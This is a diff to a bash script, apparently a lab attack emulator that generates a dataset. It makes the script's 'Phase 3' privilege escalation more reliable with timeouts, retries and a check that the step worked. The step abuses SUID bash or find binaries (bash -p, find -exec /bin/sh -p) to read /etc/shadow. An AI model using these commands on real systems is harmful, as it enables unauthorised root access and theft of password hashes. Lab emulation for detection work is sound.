@@ -14,6 +14,7 @@ SUDO_PASS="${NOESC_LAB_PASSWORD:-}"
 FAILED_MIN="${NOESC_FAILED_SUDO_MIN:-1}"
 FAILED_MAX="${NOESC_FAILED_SUDO_MAX:-4}"
 AUTH_FAIL_CAP="${NOESC_AUTH_FAIL_CAP:-1}"
+PHASE3_TIMEOUT_SECS="${NOESC_PHASE3_TIMEOUT_SECS:-30}"
 
 if ! [[ "$FAILED_MIN" =~ ^[0-9]+$ ]]; then
   FAILED_MIN=1
@@ -23,6 +24,9 @@ if ! [[ "$FAILED_MAX" =~ ^[0-9]+$ ]]; then
 fi
 if ! [[ "$AUTH_FAIL_CAP" =~ ^[0-9]+$ ]]; then
   AUTH_FAIL_CAP=1
+fi
+if ! [[ "$PHASE3_TIMEOUT_SECS" =~ ^[0-9]+$ ]]; then
+  PHASE3_TIMEOUT_SECS=30
 fi
 
 if [ "$FAILED_MIN" -lt 1 ]; then
@@ -40,6 +44,84 @@ fi
 if [ "$AUTH_FAIL_CAP" -gt 4 ]; then
   AUTH_FAIL_CAP=4
 fi
+if [ "$PHASE3_TIMEOUT_SECS" -lt 1 ]; then
+  PHASE3_TIMEOUT_SECS=30
+fi
+
+run_phase3_payload() {
+  if command -v timeout > /dev/null 2>&1; then
+    timeout "${PHASE3_TIMEOUT_SECS}s" "$@"
+  else
+    "$@"
+  fi
+}
+
+run_phase3_with_retry() {
+  local tag="$1"
+  shift
+
+  run_phase3_payload "$@"
+  local rc=$?
+
+  if [ "$rc" -eq 124 ]; then
+    echo "[!] Phase 3 payload timed out after ${PHASE3_TIMEOUT_SECS}s (${tag}); retrying once"
+    run_phase3_payload "$@"
+    rc=$?
+  fi
+
+  return "$rc"
+}
+
+run_find_phase3_payload() {
+  local payload="$1"
+  local marker_dir="${XDG_RUNTIME_DIR:-${HOME:-/tmp}}"
+  local marker
+
+  marker="$(mktemp "${marker_dir}/.noesc_phase3_ok_XXXXXX" 2>/dev/null)" || {
+    # Fallback if runtime/home path is unavailable.
+    marker="$(mktemp "/tmp/.noesc_phase3_ok_XXXXXX")" || return 71
+  }
+
+  # Ensure marker starts empty and remains user-owned for reliable cleanup.
+  : > "$marker"
+
+  run_phase3_payload "$payload" /tmp -maxdepth 0 -exec /bin/sh -p -c 'head -n 1 /etc/shadow > /dev/null 2>&1 && echo ok > "$1"' _ "$marker" \; -quit
+  local rc=$?
+
+  if [ "$rc" -ne 0 ]; then
+    rm -f "$marker" 2>/dev/null || true
+    return "$rc"
+  fi
+
+  if ! grep -q '^ok$' "$marker" 2>/dev/null; then
+    rm -f "$marker" 2>/dev/null || true
+    # Command ran but privilege-read gate did not succeed.
+    return 70
+  fi
+
+  rm -f "$marker" 2>/dev/null || true
+  return 0
+}
+
+run_find_phase3_with_retry() {
+  local tag="$1"
+  local payload="$2"
+
+  run_find_phase3_payload "$payload"
+  local rc=$?
+
+  if [ "$rc" -ne 0 ]; then
+    if [ "$rc" -eq 124 ]; then
+      echo "[!] Phase 3 payload timed out after ${PHASE3_TIMEOUT_SECS}s (${tag}); retrying once"
+    else
+      echo "[!] Phase 3 payload did not satisfy privileged-read gate (${tag}, rc=${rc}); retrying once"
+    fi
+    run_find_phase3_payload "$payload"
+    rc=$?
+  fi
+
+  return "$rc"
+}
 
 echo "==============================================="
 echo "NoEsc Lab Breakout (Randomized)"
@@ -156,12 +238,33 @@ fi
 echo "    Using payload: $suid_bin (kind=$kind)"
 
 if [ "$kind" = "bash" ]; then
-  "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' || true
+  run_phase3_with_retry "kind=bash" "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1'
+  rc=$?
+  if [ "$rc" -ne 0 ]; then
+    mount_opts="$(findmnt -T "$suid_bin" -no OPTIONS 2>/dev/null || echo unknown)"
+    echo "[!] Payload mount options for $suid_bin: $mount_opts"
+    echo "[-] Phase 3 payload failed (kind=bash, rc=${rc}); aborting to preserve dataset integrity"
+    exit 1
+  fi
 elif [ "$kind" = "find" ]; then
-  "$suid_bin" . -exec /bin/sh -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' \; -quit || true
+  # Bound traversal to keep execution deterministic while still exercising SUID find abuse.
+  run_find_phase3_with_retry "kind=find" "$suid_bin"
+  rc=$?
+  if [ "$rc" -ne 0 ]; then
+    echo "[-] Phase 3 payload failed (kind=find, rc=${rc}); aborting to preserve dataset integrity"
+    exit 1
+  fi
 else
-  "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' || true
-  "$suid_bin" . -exec /bin/sh -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' \; -quit || true
+  run_phase3_with_retry "kind=unknown/bash-path" "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1'
+  rc=$?
+  if [ "$rc" -ne 0 ]; then
+    run_find_phase3_with_retry "kind=unknown/find-path" "$suid_bin"
+    rc=$?
+  fi
+  if [ "$rc" -ne 0 ]; then
+    echo "[-] Phase 3 payload failed for both unknown paths (rc=${rc}); aborting to preserve dataset integrity"
+    exit 1
+  fi
 fi
 
 echo "[+] Breakout run complete"
